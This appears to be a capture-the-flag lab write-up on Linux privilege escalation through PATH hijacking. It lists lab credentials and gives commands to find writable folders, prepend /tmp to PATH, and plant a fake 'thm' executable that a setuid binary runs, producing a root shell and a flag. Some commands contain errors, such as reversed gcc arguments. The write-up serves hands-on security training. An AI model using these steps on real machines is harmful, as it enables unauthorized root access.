Username: karen
Password: Password1

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

Typically the PATH will look like this:
```
$ echo $PATH
/usr/local/sbin:
/usr/local/bin:
/usr/sbin:
/usr/bin:
/sbin:
/bin:
/usr/games:
/usr/local/games:
/snap/bin
```
A simple search for writable folders can done using the `find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u` command. The output of this command can be cleaned using a simple cut and sort sequence.
```
dev
etc
home
proc
run
snap
sys
tmp
usr
var
```
Comparing this with PATH will help us find folders we could use. 


We see a number of folders under `/usr`, thus it could be easier to run our writable folder search once more to cover subfolders. 

```
$ find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
snap/core20
usr/lib
```

Unfortunately, subfolders under /usr are not writable


The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the `export PATH=/tmp:$PATH` command accomplishes this. 
```
$ export PATH=/tmp:$PATH
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Back to the machine, in the `murdoch` directory we have
```
$ cd home
$ ls
matt  murdoch  ubuntu
$ cd murdoch
$ ls
test  thm.py
$ file *
test:   setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1724ca90b94176ea2eb867165e837125e8e5ca52, for GNU/Linux 3.2.0, not stripped
thm.py: Python script, ASCII text executable
$ cat thm.py
/usr/bin/python3

import os
import sys

try: 
	os.system("thm")
except:
	sys.exit()
```
The idea is to create a executable file in /tmp, in this case, `thm.c` and `thm`
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```
Command:
```
$ echo '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void) {setuid(0);setgid(0);system("/bin/bash -p");return 0;}' > thm
```
```
$ gcc -o thm.c thm
$ chmod +x thm
$ chmod +s thm
```
But GCC compiler is not installed in the machine, so we can use a simpler way to get root
```
$ echo "/bin/bash" > thm
$ chmod +x thm
$ chmod +s thm
$ cd /home/murdoch
$ ./test
root@ip-10-10-72-136:/home/murdoch# 
root@ip-10-10-72-136:/home/murdoch# cat /home/matt/flag6.txt
THM-736628929
```